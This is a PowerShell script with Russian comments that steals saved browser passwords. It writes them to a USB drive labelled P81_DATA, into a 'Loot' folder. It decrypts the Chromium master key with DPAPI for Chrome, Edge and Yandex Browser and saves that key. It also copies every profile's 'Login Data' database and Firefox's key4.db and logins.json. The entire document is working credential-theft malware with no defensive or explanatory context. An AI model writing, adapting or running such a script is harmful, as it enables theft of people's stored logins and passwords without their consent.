# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Создание папки для сбора данных (минуты и секунды в названии)
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки (Chromium)
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS.txt"

# Пути к основным браузерам
$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
)

foreach ($b in $browsers) {
    $ls = "$b\Local State"
    if (Test-Path $ls) {
        try {
            # Чтение Local State и дешифровка ключа через DPAPI
            $json = Get-Content $ls -Raw | ConvertFrom-Json
            $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $unp = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
            "[$b] Key: $([Convert]::ToBase64String($unp))" >> $report
            
            # 4. СБОР БАЗ ПАРОЛЕЙ (Login Data)
            # Ищем во всех профилях и копируем с понятным именем
            Get-ChildItem -Path $b -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
                $name = ($_.Directory.Parent.Name + "_" + $_.Directory.Name)
                Copy-Item $_.FullName -Destination "$dest\$name.db" -Force
            }
        } catch {}
    }
}

# 5. СБОР ДАННЫХ FIREFOX
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem $ff -Directory | ForEach-Object {
        $n = $_.Name
        # Копируем ключевые файлы для дешифровки Firefox
        Copy-Item "$($_.FullName)\key4.db" -Destination "$dest\FF_$n_key4.db" -Force -ErrorAction SilentlyContinue
        Copy-Item "$($_.FullName)\logins.json" -Destination "$dest\FF_$n_logins.json" -Force -ErrorAction SilentlyContinue
    }
}

exit
